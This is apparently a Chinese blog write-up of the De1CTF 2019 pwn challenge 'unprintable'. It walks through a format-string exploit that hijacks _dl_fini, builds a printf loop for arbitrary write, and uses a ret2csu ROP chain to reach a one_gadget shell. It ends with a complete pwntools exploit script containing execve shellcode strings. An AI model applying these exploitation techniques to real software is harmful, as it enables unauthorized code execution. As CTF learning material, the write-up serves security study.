> 原文链接: https://www.anquanke.com//post/id/183859 


# 详解 De1ctf 2019 pwn——unprintable


                                阅读量   
                                **346755**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t0133c06499e9934dc1.png)](https://p4.ssl.qhimg.com/t0133c06499e9934dc1.png)



在上周末玩的De1ctf中印象最深刻的就是Unprintable这道题。好好的一个周末全让者道题目给毁了:(。当时各种方法各种爆破一通乱试，最后都失败了。赛后在看了官方和师傅们的WP后自叹不如，果然还是太年轻了。

在仔细分析了师傅们的WP后，如沐春风，这解法也太妙(sao)了吧。从中学到了很多知识点，写一篇文章记录一下，希望和师傅们交流。



## 1. 程序分析

[![](https://p2.ssl.qhimg.com/t016a50b093a47d529a.png)](https://p2.ssl.qhimg.com/t016a50b093a47d529a.png)

程序很简单，读入到bss段，格式化字符串漏洞，然后调用exit(0)退出。关闭了stdout，所以没有办法泄露。



## 2. 利用思路

利用exit中的_dl_fini函数控制程序流程。改返回地址制造printf_loop产生任意写。构造ROP链getshell。

看似步骤非常简单，但是每一步都十分巧妙，下面分布介绍。

### <a class="reference-link" name="2.1%20_dl_fini"></a>2.1 _dl_fini

第一步师傅们的思路都是一样的，利用_dl_fini中的一处call：

```
&lt;_dl_fini+777&gt;:    mov    r12,QWORD PTR [rax+0x8]
&lt;_dl_fini+781&gt;:    mov    rax,QWORD PTR [rbx+0x120]
&lt;_dl_fini+788&gt;:    add    r12,QWORD PTR [rbx]

&lt;_dl_fini+819&gt;:    call   QWORD PTR [r12+rdx*8]
```

题目中有格式化字符串漏洞，而输入的数据又不在栈上，这时就自然而然的想到了要利用栈上已有的数据。当程序运行到printf的时候栈上的数据为：

[![](https://p4.ssl.qhimg.com/t01ab310310a665f570.png)](https://p4.ssl.qhimg.com/t01ab310310a665f570.png)

其实从颜色也能看出来有一处比较特殊，是因为它指向了ld.so区域：

[![](https://p5.ssl.qhimg.com/t012319dd373453b842.png)](https://p5.ssl.qhimg.com/t012319dd373453b842.png)

巧妙的是，在之后的exit(0)中，有一处函数调用所依赖的关键就是这个指针。

我通过源码调试调试到这个位置想看看这个漏洞产生的原因：

这个地方的源代码是：

```
/* First see whether an array is given.  */
        if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)
        `{`
            ElfW(Addr) *array =
            (ElfW(Addr) *) (l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);
            unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / sizeof (ElfW(Addr)));
            while (i-- &gt; 0)
            ((fini_t) array[i]) (); //漏洞产生点，调用函数数组。
        `}`
```

这个地方是exit在调用一系列函数(destructors)来释放资源。那为什么会这么巧？偏偏就有一个函数指针在栈上可以利用？我没有分析过exit源码，但是我推断是在程序初始化的过程当中ld.so利用到了这个指针，而且留在了栈上，在程序结束的时候又利用这个指针来进行相反的操作。关于库的链接的知识还有空缺，有时间一定补上。师傅们真是太强了，向师傅们致敬。

可以说上面这一步是一个关键的突破口，如果想不到这里，就做不出来了，想到了，之后的操作就顺水推舟了。

### <a class="reference-link" name="2.2%20printf_loop"></a>2.2 printf_loop

在劫持了程序执行流之后，就想着怎么拿shell了，首先就是要拿到任意写。

因为read(buf)读不到栈上，所以还是得利用栈上的数据。

当第一次控制了程序执行流之后，在printf处下断，看此时的栈情况：

[![](https://p4.ssl.qhimg.com/t0124d59519a88eca33.png)](https://p4.ssl.qhimg.com/t0124d59519a88eca33.png)

可以观察到栈上有很多指针指向了栈本身，而且有些就在当前有效栈空间里。

这里利用了1和3。其中3本身指向了printf的返回地址，所以可以构造printf_loop。而1则是指向了当前有效栈空间，可以通过printf写来改变栈上的值使它指向任意想要的位置来实现栈上的任意写。

```
sleep(0.2)
    payload4='%'+str(stack_tail)+'c%18$hhn'+'%'+str(0xa3-stack_tail)+'c%23$hhn'
    sl(payload4)

    sleep(0.1)
    payload5='%13$n'+'%'+str(0xa3)+'c%23$hhn'
    sl(payload5)
```

上面代码中的两步写操作结合起来就构成了任意写。

### <a class="reference-link" name="2.3%20ROP"></a>2.3 ROP

有了任意写之后，就要用ROP来getshell了。

[![](https://p5.ssl.qhimg.com/t018bc6b1529b4b0f87.png)](https://p5.ssl.qhimg.com/t018bc6b1529b4b0f87.png)

可以看到程序空间里有_libc_csu，想到经典利用方法ret2csu中的利用技巧也许有用：

```
.text:0000000000400810                 mov     rdx, r13
.text:0000000000400813                 mov     rsi, r14
.text:0000000000400816                 mov     edi, r15d
.text:0000000000400819                 call    qword ptr [r12+rbx*8]
.text:000000000040081D                 add     rbx, 1
.text:0000000000400821                 cmp     rbx, rbp
.text:0000000000400824                 jnz     short loc_400810
.text:0000000000400826
.text:0000000000400826 loc_400826:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400826                 add     rsp, 8
.text:000000000040082A                 pop     rbx
.text:000000000040082B                 pop     rbp
.text:000000000040082C                 pop     r12
.text:000000000040082E                 pop     r13
.text:0000000000400830                 pop     r14
.text:0000000000400832                 pop     r15
```

其实ret2csu也算是一个gadget，利用它可以控制的指针有：rdi,esi,rdx,rcx,rbx,rbp,r12,r13,r14,r15。但是光有这个gadget似乎拿不到shell。

这时候神奇的地方就出现了，在官方WP就介绍了一个神奇的gadget：

```
.text:00000000004006E8                 adc     [rbp+48h], edx
```

在这里把它的全部调用链列出来：

```
adc    DWORD PTR [rbp+0x48],edx
    mov    ebp,esp
    call   0x400660 &lt;deregister_tm_clones&gt;
        mov    eax,0x601017
        push   rbp
        sub    rax,0x601010
        cmp    rax,0xe
        mov    rbp,rsp
        jbe    0x400690 
        pop    rbp
        ret
    pop    rbp
    mov    byte ptr [rip + 0x20094e], 1 &lt;0x601048&gt;
    ret
```

其实调用链这么长实际起作用的就是：

```
adc    DWORD PTR [rbp+0x48],edx
ret
```

而其中的edx和rbp都是可以控制的，所以我们就可以实现一次任意写。

可以看到程序空间里存在stderr,stdin,stdout，它们都指向libc，所以可以修改它们为one_gadget来getshell。

在关闭aslr的情况下stderr和one_gadget分别为：

```
stderr = 0x601040  #0x7ffff7dd2540
    one= 0x7ffff7afe147#0x7ffff7a52216 0x7ffff7a5226a  0x7ffff7afd2a4 0x7ffff7afe147
```

计算偏移修改即可。

修改完之后再次利用ret2csu传stderr的地址给r12，**最后调用call qword ptr [r12+rbx*8]**拿到shell。

附上完整exp ：

```
from pwn_debug import *

pdbg=pwn_debug("1")
pdbg.context.terminal=['tmux', 'splitw', '-h']
context.log_level='debug'
pdbg.local("")
pdbg.debug("2.23")
pdbg.remote('111.198.29.45',)

switch=1
if switch==1:
    p=pdbg.run("local")
elif switch==2:
    p=pdbg.run("debug")
elif switch==3:
    p=pdbg.run("remote")
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, ''))
uu64    = lambda data   :u64(data.ljust(8, ''))
bp      = lambda bkp                :pdbg.bp(bkp)
#elf=pdbg.elf
#libc=pdbg.libc
sh_x86_18="x6ax0bx58x53x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
sh_x86_20="x31xc9x6ax0bx58x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
sh_x64_21="xf7xe6x50x48xbfx2fx62x69x6ex2fx2fx73x68x57x48x89xe7xb0x3bx0fx05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
def pwn():
    pop_rsp=0x40082d

    ru('This is your gift: ')
    stack=int(ru('n'),16)
    #if stack&amp;0xffff&gt;0x2000:
    #   p.close()
    print hex(stack)
    payload1='%'+str(0x298)+'c'+'%26$hn'
    payload1=payload1.ljust(16,'x00')+p64(0x4007A3)

    sleep(0.1)
    sl(payload1)
    bp([0x4007c1])

    sleep(0.1)
    payload2='%'+str(0xa3)+'c%23$hhn'
    sl(payload2)
    input()
    sleep(0.1)
    stack_tail=(stack-280)&amp;0xff
    payload3='%'+str(0x48)+'c%18$hhn'+'%'+str(0xa3-0x48)+'c%23$hhn'

    sleep(0.1)
    sl(payload3)
    #get arbitray write
    sleep(0.2)
    payload4='%'+str(stack_tail)+'c%18$hhn'+'%'+str(0xa3-stack_tail)+'c%23$hhn'
    sl(payload4)

    sleep(0.1)
    payload5='%13$n'+'%'+str(0xa3)+'c%23$hhn'
    sl(payload5)

    sleep(0.2)
    payload4='%'+str(stack_tail+4)+'c%18$hhn'+'%'+str(0xa3-stack_tail-4)+'c%23$hhn'
    sl(payload4)

    sleep(0.1)
    payload5='%13$n'+'%'+str(0xa3)+'c%23$hhn'
    sl(payload5)  #clear up the first arg

    sleep(0.2)
    payload4='%'+str(stack_tail+4)+'c%18$hhn'+'%'+str(0xa3-stack_tail-4)+'c%23$hhn'
    sl(payload4)

    sleep(0.1)
    payload5='%13$n'+'%'+str(0xa3)+'c%23$hhn'
    sl(payload5)#clear up the first arg



    sleep(0.2) #fake_heap=0x6010a0
    payload4='%'+str(stack_tail)+'c%18$hhn'+'%'+str(0xa3-stack_tail)+'c%23$hhn'
    sl(payload4)

    sleep(0.1)
    payload5='%'+str(0xa3)+'c%23$hhn'+'%'+str(0x10a0-0xa3)+'c%13$hn'
    sl(payload5)

    sleep(0.2) #fake_heap=0x6010a0
    payload4='%'+str(stack_tail+2)+'c%18$hhn'+'%'+str(0xa3-stack_tail-2)+'c%23$hhn'
    sl(payload4)

    sleep(0.1)
    payload5='%'+str(0x60)+'c%13$hhn'+'%'+str(0xa3-0x60)+'c%23$hhn'
    sl(payload5)

    # merge heap and ROP
    prbp = 0x400690 #pop rbp;ret;
    prsp = 0x40082d #pop rsp r13 r14 r15 ;ret
    adc = 0x4006E8  
    '''
    adc    DWORD PTR [rbp+0x48],edx
    mov    ebp,esp
    call   0x400660 &lt;deregister_tm_clones&gt;
    pop    rbp
    mov    byte ptr [rip + 0x20094e], 1 &lt;0x601048&gt;
    ret

    mov    eax,0x601017
    push   rbp
    sub    rax,0x601010
    cmp    rax,0xe
    mov    rbp,rsp
    jbe    0x400690 
    pop    rbp
    ret   
    '''
    arsp = 0x0400848 #add    rsp,0x8;ret
    prbx = 0x40082A #pop rbx rbp r12 r13 r14 r15;ret
    call = 0x400810 #mov    rdx,r13
                    #mov    rsi,r14
                    #mov    edi,r15d
                    #call   QWORD PTR [r12+rbx*8]
    stderr = 0x601040  #0x7ffff7dd2540
    one= 0x7ffff7afe147#0x7ffff7a52216 0x7ffff7a5226a  0x7ffff7afd2a4 0x7ffff7afe147
    rop=0x6010a0
    payload6 = p64(arsp)*3
    #                   rbx   rbp      r12     r13    r14 r15
    payload6 += flat(prbx,0,stderr-0x48,rop,0xFFD2BC07,0,  0,  call)
    payload6 += flat(adc,0,prbx,0,0,stderr,0,0,0,0x400819)

    sleep(1)
    payload5='%'+str(0x82d)+'c%23$hn'
    payload5=payload5.ljust(0x40,'x00')+payload6

    #bp([0x4007c1])
    sl(payload5)

    it()


if __name__=='__main__':
    while 1:
        try:
            pwn()
        except:
            p.close()
            p=pdbg.run("local")
```



## 3. 补充

在看了[Kirin师傅的wp](https://www.jianshu.com/p/9fc6a4e98ecb)后觉得师傅的思路也非常好，这里记录一下。

前面思路相同，getshell的时候，调用puts在栈上留一个libc中的地址，改一字节得到syscall，再利用ret2csu控制rdi,rsi,rdx,利用read的返回值控制rax，最后调用syscall拿shell。



## 4. 总结

这是一道非常好的题目，涉面广泛，感谢De1ta。这道题教会了我要充分的重视栈上的数据来达成利用，栈是所有函数调用都会使用到的结构，前面函数执行完之后多少会在栈上留下蛛丝马迹，充分利用它们，也许就能拿shell。再次感谢De1ta。
